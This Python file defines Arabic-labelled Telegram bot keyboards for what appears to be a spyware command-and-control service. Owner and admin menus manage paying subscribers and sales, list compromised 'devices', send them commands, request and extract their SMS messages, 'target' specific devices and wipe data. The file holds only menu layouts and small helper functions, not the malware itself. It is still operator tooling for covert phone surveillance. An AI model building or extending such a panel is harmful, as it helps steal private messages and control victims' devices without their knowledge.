#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Keyboards - تعريف لوحات المفاتيح وهيكلها

هذا الملف يحتوي على تعريفات لوحات المفاتيح المستخدمة في البوت.
"""

from telegram import InlineKeyboardButton, InlineKeyboardMarkup

# تعريف أزرار المالك (وصول كامل)
OWNER_MAIN_MENU = [
    ["إدارة المشتركين", "إدارة الأجهزة"],
    ["استهداف جهاز محدد", "إدارة النظام"],
    ["إدارة المبيعات", "المساعدة والدعم"]
]

# القوائم الفرعية للمالك
OWNER_SUBSCRIBERS_MENU = [
    ["إضافة مشترك", "عرض المشتركين"],
    ["إزالة مشترك", "تعديل صلاحيات"],
    ["رجوع"]
]

OWNER_DEVICES_MENU = [
    ["عرض الأجهزة", "إرسال أوامر"],
    ["طلب رسائل SMS", "تنظيف البيانات"],
    ["رجوع"]
]

OWNER_TARGETING_MENU = [
    ["تحديد جهاز مستهدف", "إلغاء استهداف"],
    ["إعدادات الفلترة", "استخراج رسائل مخصصة"],
    ["تنبيهات الجهاز المستهدف", "تقارير الاستهداف"],
    ["رجوع"]
]

# تعريف أزرار الأدمن (وصول محدود)
ADMIN_MAIN_MENU = [
    ["إدارة العملاء", "استهداف جهاز محدد"],
    ["الإحصائيات", "المساعدة"]
]

# القوائم الفرعية للأدمن
ADMIN_CLIENTS_MENU = [
    ["عرض العملاء", "طلب رسائل SMS"],
    ["إرسال أوامر بسيطة"],
    ["رجوع"]
]

ADMIN_TARGETING_MENU = [
    ["تحديد جهاز مستهدف", "إلغاء استهداف"],
    ["عرض رسائل الجهاز المستهدف"],
    ["رجوع"]
]


def get_owner_keyboard(menu_items):
    """إنشاء لوحة مفاتيح للمالك"""
    keyboard = []
    
    for row in menu_items:
        keyboard_row = []
        for item in row:
            # تحويل اسم الزر إلى معرف فريد للاستجابة
            callback_data = item.lower().replace(" ", "_")
            keyboard_row.append(InlineKeyboardButton(item, callback_data=callback_data))
        keyboard.append(keyboard_row)
    
    return keyboard


def get_admin_keyboard(menu_items):
    """إنشاء لوحة مفاتيح للأدمن"""
    # يمكن تخصيص لوحة مفاتيح الأدمن بشكل مختلف عن المالك إذا لزم الأمر
    return get_owner_keyboard(menu_items)


def get_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("الأجهزة", callback_data='devices')],
        [InlineKeyboardButton("إرسال أمر", callback_data='send_command')],
        [InlineKeyboardButton("الإعدادات", callback_data='settings')]
    ])


def get_back_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("العودة", callback_data='main_menu')]
    ])